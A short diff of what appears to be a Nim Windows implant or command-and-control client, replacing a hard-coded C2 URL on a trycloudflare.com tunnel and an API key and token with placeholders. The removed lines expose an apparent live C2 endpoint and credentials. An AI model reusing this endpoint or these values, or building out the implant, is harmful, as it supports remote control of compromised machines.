@@ -3,9 +3,9 @@ import std/[os, osproc, strutils, random, json]
 import winim/lean
 import winim/inc/wininet
 
-const C2_URL = "https://mandatory-zip-installing-illinois.trycloudflare.com"
-const API_KEY = "964fb7928cd27b5faf3b8971e5befcf6"
-const TOKEN = "57c36cda7fe1823797273b065ea3b8f8"
+const C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
+const API_KEY = "00000000000000000000000000000000"
+const TOKEN = "00000000000000000000000000000000"
 
 type HINTERNET = pointer
 
